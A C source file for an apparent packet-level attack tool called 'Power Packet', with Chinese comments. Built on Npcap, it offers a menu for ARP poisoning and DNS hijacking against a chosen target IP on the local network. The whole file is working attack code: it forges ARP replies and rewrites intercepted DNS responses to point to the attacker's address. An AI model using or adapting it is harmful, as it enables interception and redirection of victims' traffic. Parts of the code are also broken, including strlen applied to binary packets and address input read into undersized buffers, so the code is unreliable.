#include <pcap.h>
#include "ProtocolHeaders.h"
#include "FalsifyPackets.h"

#define ETHER_ADDR_LEN 6
#define IP_ADDR_LEN 4
#define DNS_HEADER_LEN 12
size_t IP_HEADER_LEN;

char *IPv4MTU;
pcap_t *ADHandle;//网卡操作句柄

void PowerPacket() {
	printf( "__________                                  \n");
	printf( "\\______   \\______  _  __ ___________        \n");
	printf( " |     ___/  _ \\ \\/ \\/ // __ \\_  __ \\       \n");
	printf( " |    |  (  <_> )     /\\  ___/|  | \\/       \n");
	printf( " |____|   \\____/ \\/\\_/  \\___  >__|          \n");
	printf( "                            \\/              \n");
	printf( "__________                __           __   \n");
	printf( "\\______   \\_____    ____ |  | __ _____/  |_ \n");
	printf( " |     ___/\\__  \\ _/ ___\\|  |/ // __ \\   __\\\n");
	printf( " |    |     / __ \\\\  \\___|    <\\  ___/|  |  \n");
	printf( " |____|    (____  /\\___  >__|_ \\\\___  >__|  \n");
	printf( "                \\/     \\/     \\/    \\/      \n\n");
}

char* ip_to_str(uint8_t *ip_addr) {
	static char ip_str[16];
	snprintf(ip_str, sizeof(ip_str), "%u.%u.%u.%u",
	         ip_addr[0], ip_addr[1], ip_addr[2], ip_addr[3]);
	return ip_str;
}

void PacketCopy(uint8_t *Param, const struct pcap_pkthdr *Header, const uint8_t *PacketData) {
	(VOID)Param;//该参数丢弃不用
	uint32_t i;
	IPv4MTU = (char *)malloc(sizeof(char) * (Header->len + 1));
	for (i = 0; i < Header->len; i++)
		IPv4MTU[i] = PacketData[i];
	IPv4MTU[i] = '\0';
}

void ARPPoisoning(char *AttackerIP, char *AttackerMac, char *DestIP) {
	if (IsARPPacket(IPv4MTU, strlen(IPv4MTU))) {
		IPv4ARPHeader ARP = IPv4ARPParser(IPv4MTU + 14, strlen(IPv4MTU) - 14);
		if (ARP.ErrMsg == 0)
			if (ARP.Operation == 1 && !strcmp(DestIP, (char *)ARP.SrcProtocolAdd)) {
				FalsifyResponseARP(IPv4MTU + 14, IPv4MTU + 14, AttackerMac, AttackerIP);
				for (int i = 0; i < 100; ++i) {
					if (pcap_sendpacket(ADHandle, (uint8_t *)IPv4MTU, strlen(IPv4MTU)))
						break;
				}
			}
	}
	free(IPv4MTU);
}

char *DNSDataHandle(const char *Mac, const char *IP, const char* orig_packet, size_t orig_len) {
	IP_HEADER_LEN = (size_t)IPv4Parser((char *)orig_packet + 14,orig_len - 14).HeadLen;
	if (orig_len < 14 + IP_HEADER_LEN) {
		fprintf(stderr, "数据包过小\n");
		return NULL;
	}
	size_t dns_data_len = orig_len - 14 - IP_HEADER_LEN; // 计算 DNS 数据长度
	if (dns_data_len <= 0) {
		fprintf(stderr, "数据部分过小\n");
		return NULL;
	}
	size_t new_packet_len = 14 + IP_HEADER_LEN + dns_data_len;
	char *Copy1DNSReq = (char *)malloc(new_packet_len);
	if (!Copy1DNSReq) {
		perror("内存分配失败");
		return NULL;
	}
	memcpy(Copy1DNSReq, orig_packet, new_packet_len);
	memcpy(Copy1DNSReq + 6, Mac, ETHER_ADDR_LEN);
	memcpy(Copy1DNSReq + 26, IP, IP_ADDR_LEN);
	char IPHeadBuffer[IP_HEADER_LEN];
	memcpy(IPHeadBuffer, Copy1DNSReq + 14, IP_HEADER_LEN);
	IPHeadBuffer[10] = IPHeadBuffer[11] = 0;
	uint16_t Sum0 = Checksum(IPHeadBuffer, IP_HEADER_LEN);
	Copy1DNSReq[22] = (Sum0 >> 8) & 0xFF;
	Copy1DNSReq[23] = Sum0 & 0xFF;
	size_t for_checksum_len = 12 + dns_data_len;
	char *ForChecksum = (char *)malloc(for_checksum_len);
	if (!ForChecksum) {
		free(Copy1DNSReq);
		perror("内存分配失败");
		return NULL;
	}
	memcpy(ForChecksum, IP, IP_ADDR_LEN);
	memcpy(ForChecksum + 4, orig_packet + 14 + 12, IP_ADDR_LEN);
	ForChecksum[8] = 0;
	ForChecksum[9] = 17;
	uint16_t udp_len = dns_data_len + 8;
	ForChecksum[10] = (udp_len >> 8) & 0xFF;
	ForChecksum[11] = udp_len & 0xFF;
	memcpy(ForChecksum + 12, orig_packet + 14 + IP_HEADER_LEN, dns_data_len);
	uint16_t Sum = Checksum(ForChecksum, for_checksum_len);
	Copy1DNSReq[14 + IP_HEADER_LEN + 6] = (Sum >> 8) & 0xFF;
	Copy1DNSReq[14 + IP_HEADER_LEN + 7] = Sum & 0xFF;
	free(ForChecksum);
	return Copy1DNSReq;
}

void DNSHijacking(const char *AttackerIP, const char *AttackerMac, const char *DestIP) {
	if (!IPv4MTU)
		return;
	size_t mtu_len = strlen(IPv4MTU);
	if (IsDNSPacket(IPv4MTU, mtu_len)) {
		IPv4Header IP = IPv4Parser(IPv4MTU + 14, mtu_len - 14);
		if (IP.ErrMsg == 0 && !strcmp(DestIP, (char *)IP.SrcAdd)) {
			char *Copy1DNSReq = DNSDataHandle(AttackerMac, AttackerIP, IPv4MTU, mtu_len);
			if (!Copy1DNSReq)
				return;
			for (int i = 0; i < 100; ++i)
				if (pcap_sendpacket(ADHandle, (const uint8_t *)Copy1DNSReq, mtu_len))
					break;
			free(Copy1DNSReq);
			char *FakeDNSRes = NULL;
			while (true) {
				free(IPv4MTU);
				IPv4MTU = NULL;
				pcap_loop(ADHandle, 1, (pcap_handler)PacketCopy, NULL);
				if (!IPv4MTU) {
					fprintf(stderr, "Error reading next packet.\n");
					return;
				}
				size_t new_mtu_len = strlen(IPv4MTU);
				if (IsDNSPacket(IPv4MTU, new_mtu_len)) {
					IPv4Header response_ip = IPv4Parser(IPv4MTU + 14, new_mtu_len - 14);
					if (response_ip.ErrMsg == 0 && !strcmp(DestIP, ip_to_str(response_ip.DestAdd)) && (IPv4MTU[44] & 0x80)) {
						FakeDNSRes = (char *)malloc(new_mtu_len + 1);
						if (!FakeDNSRes) {
							fprintf(stderr, "内存错误\n");
							free(IPv4MTU);
							return;
						}
						memcpy(FakeDNSRes, IPv4MTU, new_mtu_len + 1);
						break;
					}
				}
			}
			char *ModifiedResponse = FalsifyResponseDNS(Copy1DNSReq, IPv4MTU, mtu_len, FakeDNSRes, AttackerIP);
			if (!ModifiedResponse) {
				free(FakeDNSRes);
				free(IPv4MTU);
				return;
			}
			char DestMac[ETHER_ADDR_LEN];
			for (int i = 0; i < 6; i++)
				FakeDNSRes[i + 6] = AttackerMac[i];
			memcpy(DestMac, Copy1DNSReq + 6, ETHER_ADDR_LEN);
			char *HandledDNSRes = DNSDataHandle(DestMac, DestIP, ModifiedResponse, strlen(ModifiedResponse));
			if (!HandledDNSRes) {
				free(FakeDNSRes);
				free(IPv4MTU);
				return;
			}
			for (int i = 0; i < 100; ++i) {
				if (pcap_sendpacket(ADHandle, (uint8_t *)HandledDNSRes, strlen(HandledDNSRes)))
					break;
			}
			free(HandledDNSRes);
			free(FakeDNSRes);
			free(IPv4MTU);
		}
	}
}

int InitAndMenu() { //初始化-菜单，询问启用哪个网卡为混杂模式
	pcap_if_t *Devs;//网卡列表句柄
	pcap_if_t *DevPtr;//选择的网卡的句柄
	int Choice;//选择的网卡的编号
	int DevQuantity = 0; //网卡数量
	char ERRMSG[PCAP_ERRBUF_SIZE];//错误信息
	if (pcap_findalldevs(&Devs, ERRMSG) == -1) {
		fprintf(stderr, "寻找网卡时发生错误 %s\n", ERRMSG);
		exit(1);
	}
	for (DevPtr = Devs; DevPtr; DevPtr = DevPtr->next) {
		printf("%d.%s", ++DevQuantity, DevPtr->name);
		if (DevPtr->description)
			printf(" （%s）\n", DevPtr->description);
		else
			printf(" （该网卡无法识别）\n");
	}
	if (DevQuantity == 0) {
		printf("无法访问网卡接口。确保你安装了Npcap库哦\n");
		return -1;
	}
	printf("输入网卡序列号 (1-%d):", DevQuantity);
	scanf("%d", &Choice);
	if (Choice < 1 || Choice > DevQuantity) {
		printf("没有这个网卡哦\n");
		pcap_freealldevs(Devs);
		return -1;
	}
	for (DevPtr = Devs; Choice > 1; DevPtr = DevPtr->next, Choice--);
	if ((ADHandle = pcap_open_live(DevPtr->name,	//设备名
	                               65536,			//最大监听端口
	                               1,				//混杂模式（非0）
	                               1000,			//超时设置
	                               ERRMSG			//错误信息
	                              )) == NULL) {
		fprintf(stderr, "\n无法启动该网卡。 %s 不受Npcap库支持＞﹏＜\n", DevPtr->name);
		pcap_freealldevs(Devs);
		return -1;
	}
	printf("%s的混杂模式已开启！\n", DevPtr->description);
	/*设备列表句柄此时可以删除了*/
	pcap_freealldevs(Devs);
	/*开始捕获*/
	return 0;
}

int main() {
	PowerPacket();
	InitAndMenu();
	printf("输入操作码：1.ARP攻击 2.DNS劫持\n");
	int Choice;
	scanf("%d", &Choice);
	if (Choice == 1) {
		char AttackerIP[IP_ADDR_LEN];
		char AttackerMac[ETHER_ADDR_LEN];
		char DestIP[IP_ADDR_LEN];
		printf("输入攻击者IP地址: ");
		scanf("%s", AttackerIP);
		printf("输入攻击者MAC地址: ");
		scanf("%s", AttackerMac);
		printf("输入目标IP地址: ");
		scanf("%s", DestIP);
		while (1) {
			pcap_loop(ADHandle, 1, PacketCopy, NULL);
			ARPPoisoning(ip_to_str((uint8_t *)AttackerIP), AttackerMac, ip_to_str((uint8_t *)DestIP));
		}
	} else if (Choice == 2) {
		char AttackerIP[IP_ADDR_LEN];
		char AttackerMac[ETHER_ADDR_LEN];
		char DestIP[IP_ADDR_LEN];
		printf("输入攻击者IP地址: ");
		scanf("%s", AttackerIP);
		printf("输入攻击者MAC地址: ");
		scanf("%s", AttackerMac);
		printf("输入目标IP地址: ");
		scanf("%s", DestIP);
		while (1) {
			pcap_loop(ADHandle, 1, PacketCopy, NULL);
			DNSHijacking(ip_to_str((uint8_t *)AttackerIP), AttackerMac, ip_to_str((uint8_t *)DestIP));
		}
	} else {
		printf("无效的操作码\n");
	}
	pcap_close(ADHandle);
	return 0;
}
